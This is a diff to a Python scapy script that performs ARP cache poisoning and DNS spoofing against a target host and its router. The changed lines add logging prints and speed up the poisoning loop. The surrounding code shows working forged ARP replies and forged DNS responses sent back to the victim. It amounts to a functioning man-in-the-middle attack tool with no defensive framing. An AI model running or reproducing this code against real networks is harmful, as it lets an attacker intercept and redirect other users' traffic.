@@ -39,6 +39,7 @@ def dnsSpoofing(targetIP, spoofIP,sourceIP):
 
 def forwardDnsSpoofing():
     def forwardDNS(orgPacket: IP):
+        print(orgPacket)
         packet = scapy.IP(dst='127.0.0.1') 
         packet= packet / scapy.UDP(sport=orgPacket[UDP].sport) 
         packet= packet / scapy.DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
@@ -46,6 +47,7 @@ def forwardDnsSpoofing():
         responsePacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=53) / DNS()
         responsePacket[DNS] = answer[DNS]
         scapy.send(responsePacket, verbose=0)
+    print('DNS spoofing started')
     return forwardDNS
 
 def main():
@@ -75,7 +77,7 @@ def main():
     while True:
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
-        scapy.time.sleep(2)
+        scapy.time.sleep(1)
 
 if __name__ == '__main__':
     main()
